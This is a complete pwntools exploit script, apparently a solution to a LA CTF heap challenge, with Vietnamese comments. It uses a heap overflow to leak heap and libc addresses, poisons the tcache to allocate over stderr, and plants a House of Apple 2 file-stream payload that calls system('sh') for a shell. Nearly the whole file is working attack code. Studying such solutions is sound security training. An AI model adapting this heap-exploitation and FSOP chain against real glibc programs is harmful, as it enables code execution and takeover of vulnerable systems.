from pwn import *

# Cấu hình
exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = 'info'

def conn():
    # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    return remote("chall.lac.tf", 31144)

p = conn()

def create(idx, size, data):
    p.sendlineafter(b"Choice > ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"Choice > ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

def view(idx):
    p.sendlineafter(b"Choice > ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    return p.recvuntil(b"____", drop=True)

# =============================================================================
# 1. LEAK HEAP BASE
# =============================================================================
log.info("=== STEP 1: LEAK HEAP BASE ===")
create(0, 0x10, b"A"*8) 
create(1, 0x10, b"B"*8) 
delete(1)
delete(0)

# Overflow từ Chunk 0 để đọc FD của Chunk 1
# Padding 32 bytes (16 Data + 8 Prev + 8 Size) -> Chạm đúng FD
create(0, 0, b"A"*32)

leak_data = view(0).split(b'\n')[0]
heap_leak = u64(leak_data[32:40].ljust(8, b'\x00'))
heap_base = heap_leak << 12
log.success(f"Heap Base: {hex(heap_base)}")

# Reset State: Khôi phục Chunk 1
delete(0)
# Chunk 0 @ 0x2a0, Chunk 1 @ 0x2c0
chunk1_ptr = heap_base + 0x2c0
key = chunk1_ptr >> 12
# Restore: Padding 16 (Data C0) + Header C1 (Size 0x21) + FD (NULL ^ Key)
create(0, 0, b"A"*16 + p64(0) + p64(0x21) + p64(0 ^ key)) 
delete(0)

# =============================================================================
# 2. LEAK LIBC (CORRECTED PADDING)
# =============================================================================
log.info("=== STEP 2: LEAK LIBC ===")
# Setup
create(0, 0x10, b"A")
create(1, 0x10, b"B")

# Fake Chunk 0x421 tại vị trí Chunk 1
fake_size = 0x421
payload = b"A" * 16                 # Padding tới Header Chunk 1 (Fixed: 16 bytes)
payload += p64(0) + p64(fake_size) # Ghi đè PrevSize=0, Size=0x421
payload += b"\x00" * 0x410         # Fill Body (0x420 - 0x10 = 0x410)

# Fencepost 1 (Fake Next Chunk)
payload += p64(0) + p64(0x21)      
# Fencepost 2 (Để set PREV_INUSE)
payload += b"\x00" * 16            
payload += p64(0) + p64(0x21)      

delete(0) # Free 0 để overwrite
create(0, 0, payload) 

# Free Chunk 1 (Size 0x421) -> Unsorted Bin
delete(1) 
log.info("Chunk 1 freed to Unsorted Bin!")

# Leak Libc bằng cách đọc từ Chunk 0
# Libc Pointer (FD) nằm tại offset 0x10 của Chunk 1.
# Từ Chunk 0 Data (offset -0x10) -> Offset là 32.
# Ta ghi đè 32 byte 'A' để puts không bị ngắt.
delete(0)
create(0, 0, b"A"*32)

raw_data = view(0).split(b'\n')[0]
libc_leak = u64(raw_data[32:40].ljust(8, b'\x00'))
log.info(f"Libc Leak: {hex(libc_leak)}")

libc.address = libc_leak - 0x219ce0 
log.success(f"Libc Base: {hex(libc.address)}")

# Cleanup: Xóa Chunk 0
delete(0)

# =============================================================================
# 3. HOUSE OF APPLE 2 (FSOP)
# =============================================================================
log.info("=== STEP 3: PWN VIA STDERR ===")
# Tấn công _IO_2_1_stderr_
target = libc.sym['_IO_2_1_stderr_']
key = (heap_base + 0x2a0) >> 12 # Chunk 0 location
poison = key ^ target

# Poison Tcache Chunk 0 -> stderr
create(0, 0, b"A"*16 + p64(0) + p64(0x21) + p64(poison))
delete(0)

create(0, 0x10, b"JUNK") # Lấy Chunk 0
# Lần alloc tiếp theo sẽ trả về stderr!

# Payload FSOP (House of Apple 2)
# system("/bin/sh") triggered on exit
fs = FileStructure()
fs.flags = u64(b"  sh\x00\x00\x00\x00") 
fs._IO_write_ptr = 1 # Bypass check
fs._lock = libc.sym['_IO_stdfile_0_lock']
fs._wide_data = heap_base + 0x2a0 # Trỏ về vùng heap hợp lệ
fs.vtable = libc.sym['_IO_wfile_jumps'] 
# Kỹ thuật Overlap: _wide_data->_wide_vtable trùng với fake FILE
# Offset của _IO_WDOALLOCATE trong wide vtable là 0x68
# Chúng ta ghi đè system() vào offset 0x68 của FILE struct
# (Vì ta trỏ _wide_data về chính chunk stderr này hoặc heap)
# Để đơn giản, ta dùng payload thủ công đã test:

payload_fsop = flat({
    0x00: b"  sh\x00\x00\x00\x00",  # flags (sh command)
    0x28: 1,                        # _IO_write_ptr > _IO_write_base
    0x88: libc.sym['_IO_stdfile_0_lock'],
    0xa0: heap_base + 0x200,        # _wide_data (trỏ về heap sạch)
    0xd8: libc.sym['_IO_wfile_jumps'] + 0x10 - 0x18, # Fake vtable logic
    # Khi exit -> _IO_flush_all_lockp -> _IO_overflow (offset 0x18)
    # Nhảy vào _IO_wfile_overflow (do ta chỉnh pointer trừ 0x18)
    # _IO_wfile_overflow gọi _IO_wdoallocbuf
    # _IO_wdoallocbuf gọi _IO_WDOALLOCATE
    # _IO_WDOALLOCATE gọi fp->_wide_data->_wide_vtable->doallocate
    # Ta cần setup fake wide table trên heap trước.
}, filler=b'\x00')

# Cách đơn giản hơn với system:
# Overwrite vtable = _IO_wfile_jumps
# _wide_data = heap
# heap->vtable = heap
# heap->doallocate = system
# heap+0 = "  sh"

# Setup Heap để làm Fake Wide Data (Chunk 0 đang giữ rác, dùng luôn)
# Chunk 0 tại heap_base + 0x2a0
fake_wide_vtable = flat({
    0x68: libc.sym.system 
}, filler=b'\x00')

# Ghi fake wide vtable vào Chunk 0 (đang allocated)
# Cần delete(0) rồi create lại? 
delete(0)
create(0, 0, fake_wide_vtable) # Heap + 0x2a0 giờ chứa system tại offset 0x68

# Payload cuối ghi đè stderr
payload_stderr = flat({
    0x00: b"  sh\x00\x00\x00\x00",
    0x28: 1,
    0x88: libc.sym['_IO_stdfile_0_lock'],
    0xa0: heap_base + 0x2a0,        # _wide_data trỏ về Chunk 0
    0xd8: libc.sym['_IO_wfile_jumps']
}, filler=b'\x00')

create(1, 0xf0, payload_stderr) # Index 1 alloc vào Stderr (size lớn để cover struct)

log.success("FSOP setup complete. Exiting to trigger shell...")
p.sendline(b"4") 
p.interactive()